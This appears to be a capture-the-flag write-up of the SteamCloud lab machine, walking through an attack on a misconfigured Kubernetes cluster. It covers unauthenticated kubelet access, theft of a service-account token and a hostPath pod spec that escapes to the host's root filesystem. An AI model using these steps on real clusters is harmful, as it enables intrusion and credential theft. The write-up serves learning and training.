---
description: Focused a lot on Kubernetes exploits, something I don't see often.
---

# SteamCloud

## Gaining Access

We start with an Nmap scan to see what's running:

<figure><img src="../../../.gitbook/assets/image (1811).png" alt=""><figcaption></figcaption></figure>

This wasn't very clear, so I opted for an in-depth version scan to enumerate the services better:

### Kubernetes

```
$ sudo nmap -p 22,2379,2380,8443,10249,10250,10256 -sC -sV -O -T4 10.129.96.167
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-03 00:39 EST
Nmap scan report for 10.129.96.167
Host is up (0.012s latency).

PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fcfb90ee7c73a1d4bf87f871e844c63c (RSA)
|   256 46832b1b01db71646a3e27cb536f81a1 (ECDSA)
|_  256 1d8dd341f3ffa437e8ac780889c2e3c5 (ED25519)
2380/tcp  open  ssl/etcd-server?
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.129.96.167, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2022-12-03T05:36:21
|_Not valid after:  2023-12-03T05:36:21
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: c97acc35-9166-49f7-be71-c5c5c372bd93
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: c62b7e1b-a1c1-4ed9-9185-c540b9428267
|     X-Kubernetes-Pf-Prioritylevel-Uid: f422a70a-431b-45a4-bfc2-08acbf1a8824
|     Date: Sat, 03 Dec 2022 05:40:06 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: d132d48f-1b18-48d5-b0bf-751823255098
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: c62b7e1b-a1c1-4ed9-9185-c540b9428267
|     X-Kubernetes-Pf-Prioritylevel-Uid: f422a70a-431b-45a4-bfc2-08acbf1a8824
|     Date: Sat, 03 Dec 2022 05:40:06 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.129.96.167, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2022-12-02T05:36:18
|_Not valid after:  2025-12-02T05:36:18
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
```

The most interesting ports were these. Seems like Port 8443 provided us with a lot of DNS related information, particularly minikubeCA and kubernetes.&#x20;

> Kubernetes is an open-source container orchestration system designed by Google. It supports Docker and relies on pods and nodes.

The response from port 8443 included some JSON, so I thought of visiting it to see what was on.

<figure><img src="../../../.gitbook/assets/image (2516).png" alt=""><figcaption></figcaption></figure>

Seems that we need to get a path of some sort. Used Hacktricks (as usual) to gain more information about this new technology. The main tool to use here is `kubectl`, which seems to provide for easy enumeration of this API.

{% embed url="https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security" %}

### Port 10250

Kubectl seems to reject all of my requests directed at port 8443, so we can move to another port instead. Based on Hacktricks, port 10250 would host the HTTPS API. Curl works well with fetching he information:

```
curl -k https://10.129.96.167:10250/pods
curl -k https://10.129.96.167:10250/metrics
```

From what I gathered, there are 7 pods that are running on this machine under the kube-system, but there were 8 pods in total. The nginx pod was not running on this system.

<figure><img src="../../../.gitbook/assets/image (1243).png" alt=""><figcaption></figcaption></figure>

Also worth noting that there were hints toward using this pod.

<figure><img src="../../../.gitbook/assets/image (2422).png" alt=""><figcaption></figcaption></figure>

Researching further, turns out RCE is possible within this pod because of the fact that we have access to port 10250. This can be done even without a certificate.

RCE should theoretically be possible with this host. Just checking to see which tool can be used. I ended up reading this page and using curl to execute my shells.

{% embed url="https://www.optiv.com/insights/source-zero/blog/kubernetes-attack-surface" %}

<figure><img src="../../../.gitbook/assets/image (1582).png" alt=""><figcaption></figcaption></figure>

Sweet. Now we can grab the user flag.

<figure><img src="../../../.gitbook/assets/image (391).png" alt=""><figcaption></figcaption></figure>

### Gaining Shell

I had a lot of trouble in gaining a shell on this machine. Seems that netcat, curl and wget are all not on the machine.

<figure><img src="../../../.gitbook/assets/image (2216).png" alt=""><figcaption></figcaption></figure>

I looked around for tools that could spawn a shell directly. The page above linked to `kubeletctl`, which was a CLI tool to interact with the API. This could spawn me a shell directly.

{% embed url="https://github.com/cyberark/kubeletctl" %}

<figure><img src="../../../.gitbook/assets/image (719).png" alt=""><figcaption></figcaption></figure>

## Docker Escape

This was a docker shell that we needed to escape from. We can begin from the 3 directories listed on Hacktricks:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

Within the first one, we can find these things:

<figure><img src="../../../.gitbook/assets/image (1563).png" alt=""><figcaption></figcaption></figure>

These were the 3 things that could potentially be used to impersonate something, or create new pods. Transferred the certificate and token via base64 encoding. First we need to enumerate what are the permissions that I have over the Kubernetes instances. Since we have a valid certificate, it means we need to shift back to port 8443, which is the Mnikube API port.&#x20;

This can be done easily using the kubectl command.&#x20;

```
$ kubectl --server https://10.129.96.167:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ii05aHdwa3VKeUxWaEU1bi1iZ0NTQ3R2NDBhT0FqemVrV19NUFo3NXp6S0UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzAxNTg0NzEzLCJpYXQiOjE2NzAwNDg3MTMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImY1YTVmYzkyLTY5OWUtNGJmMy1iYWYzLTFlZDBhZTEzNTljOSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImM0ZGFkYWUwLTcwNjUtNGM5Yy05YjEyLTQ0NDQzNzkzZTdhNiJ9LCJ3YXJuYWZ0ZXIiOjE2NzAwNTIzMjB9LCJuYmYiOjE2NzAwNDg3MTMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.ZZ-asc20WNQNkD1ej06ZaxstD3YPun-jwXO4EzC7JczE2m--f41XwYyvAsM1gFKLo6zqcFNL_QH3hTDF7_IFQfqssT9pvdQj0hWPdT0SUxRwAGZ2AHplZ-FgGVAj_GGRLBb_oByUtqA5fSwn674dnENh8OKhvRmt5Oj0Oe-dpjCZ7K_Z9N_Sl7qLBurnwIc24zCl_SNmO_RnVmJ1x33ziYpN154DbZqoj_A8s52ZvXHYCgFV5y_z-8mJeSQ15FVk-McAW0n-p0v8QvCCMzCyrMsVjthBc2gFG-G3yIYZUDVIJTYYYlVgQNJLKU6hHSUyhscjKNR2Vwm5yKgHRliFPw get pod
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          7h40m
```

We can find some interesting permissions with the auth can-i command.&#x20;

```
$ kubectl --server https://10.129.96.167:8443 --certificate-authority=ca.crt --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ii05aHdwa3VKeUxWaEU1bi1iZ0NTQ3R2NDBhT0FqemVrV19NUFo3NXp6S0UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzAxNTg0NzEzLCJpYXQiOjE2NzAwNDg3MTMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImY1YTVmYzkyLTY5OWUtNGJmMy1iYWYzLTFlZDBhZTEzNTljOSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImM0ZGFkYWUwLTcwNjUtNGM5Yy05YjEyLTQ0NDQzNzkzZTdhNiJ9LCJ3YXJuYWZ0ZXIiOjE2NzAwNTIzMjB9LCJuYmYiOjE2NzAwNDg3MTMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.ZZ-asc20WNQNkD1ej06ZaxstD3YPun-jwXO4EzC7JczE2m--f41XwYyvAsM1gFKLo6zqcFNL_QH3hTDF7_IFQfqssT9pvdQj0hWPdT0SUxRwAGZ2AHplZ-FgGVAj_GGRLBb_oByUtqA5fSwn674dnENh8OKhvRmt5Oj0Oe-dpjCZ7K_Z9N_Sl7qLBurnwIc24zCl_SNmO_RnVmJ1x33ziYpN154DbZqoj_A8s52ZvXHYCgFV5y_z-8mJeSQ15FVk-McAW0n-p0v8QvCCMzCyrMsVjthBc2gFG-G3yIYZUDVIJTYYYlVgQNJLKU6hHSUyhscjKNR2Vwm5yKgHRliFPw auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []
```

It appears that we are **allowed to create new pods**. This certainly looks misconfigured.

Then I went to do some research on what these mean, and what I could do with them. I found this article rather interesting.

{% embed url="https://infosecwriteups.com/kubernetes-container-escape-with-hostpath-mounts-d1b86bd2fa3" %}

So this creates another pod which basically mounts back on the original container's root directory. This would involve creating a new YAML file that would serve as the settings for the new pod. I based a lot of it on the current nginx pod that is running.&#x20;

My file looks like this:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-pd
  namespace: default
spec:
  containers:  
  - name: test-container 
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      # directory location on host
      path: /
```

<figure><img src="../../../.gitbook/assets/image (1372).png" alt=""><figcaption></figcaption></figure>

After creating this, I was able to mount onto my newly created pod.

<figure><img src="../../../.gitbook/assets/image (1466).png" alt=""><figcaption></figcaption></figure>

From there, we can head into the /mnt directory and read the root flag.&#x20;

<figure><img src="../../../.gitbook/assets/image (379).png" alt=""><figcaption></figcaption></figure>

Great machine for learning more about containers and Kubernetes.
